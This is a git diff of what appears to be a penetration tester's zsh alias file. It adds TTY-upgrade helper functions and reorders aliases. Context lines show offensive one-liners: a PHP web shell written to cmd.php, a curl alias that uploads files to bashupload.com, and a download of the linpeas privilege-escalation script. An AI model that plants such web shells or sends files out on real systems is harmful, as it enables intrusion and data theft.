@@ -77,10 +77,20 @@ gen_ps_rev () {
 
 
 # TTY upgrades
+py_tty_upgrade () {
+  echo "py_tty_upgrade is deprecated, calling uptty instead..."
+  uptty
+}
+py3_tty_upgrade () {
+  echo "py3_tty_upgrade is deprecated, calling uptty instead..."
+  uptty
+}
 uptty () {
   echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
 }
-
+alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
+alias tty_fix="stty raw -echo; fg; reset"
+alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
 
 # Ffuf vhost
 vhost() {
@@ -187,11 +197,12 @@ addhost() {
     grep "^$ip" /etc/hosts
 }
 
-alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
-alias tty_fix="stty raw -echo; fg; reset"
-alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
+
+# Other stuff
 alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
 alias upload='curl bashupload.com -T "${@}"'
 alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
 alias burl='curl -x http://127.0.0.1:8080/ -k'
+
+# Path fix
 export PATH=~/zsh-aliases/shells/:$PATH
